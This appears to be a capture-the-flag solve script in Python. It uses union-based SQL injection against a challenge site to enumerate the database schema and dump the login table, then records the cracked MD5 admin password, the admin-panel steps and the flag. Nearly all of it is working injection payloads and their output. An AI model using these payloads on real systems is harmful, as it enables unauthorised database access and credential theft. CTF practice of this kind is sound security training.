import requests

#res = requests.post("http://naughtyads.alieni.se/?id=' union select GROUP_CONCAT(schema_name SEPARATOR ', ') from information_schema.schemata;-- ", data={"id": "foo"})
#res = requests.post("http://naughtyads.alieni.se/?id=' union select GROUP_CONCAT(table_name SEPARATOR ', ') from information_schema.tables where table_schema='naughty';-- ", data={"id": "foo"})
#res = requests.post("http://naughtyads.alieni.se/?id=' union select GROUP_CONCAT(column_name SEPARATOR ', ') from information_schema.columns where table_name='ads';-- ", data={"id": "foo"})
#res = requests.post("http://naughtyads.alieni.se/?id=' union select GROUP_CONCAT(column_name SEPARATOR ', ') from information_schema.columns where table_name='login';-- ", data={"id": "foo"})
res = requests.post("http://naughtyads.alieni.se/?id=' union select CONCAT(id, ',', name, ',', password) from login;-- ", data={"id": "foo"})

print res.content

# 1,webmasterofdoom3755,5ebe2294ecd0e0f08eab7690d2a6ee69
# google 5ebe2294ecd0e0f08eab7690d2a6ee69 => "secret"

# visit http://naughtyads.alieni.se/admin/, username webmasterofdoom3755 password secret, add number 555-31338, get flag
# SECT{~tr4nsv3stiT3s_w3lc0me_t00~}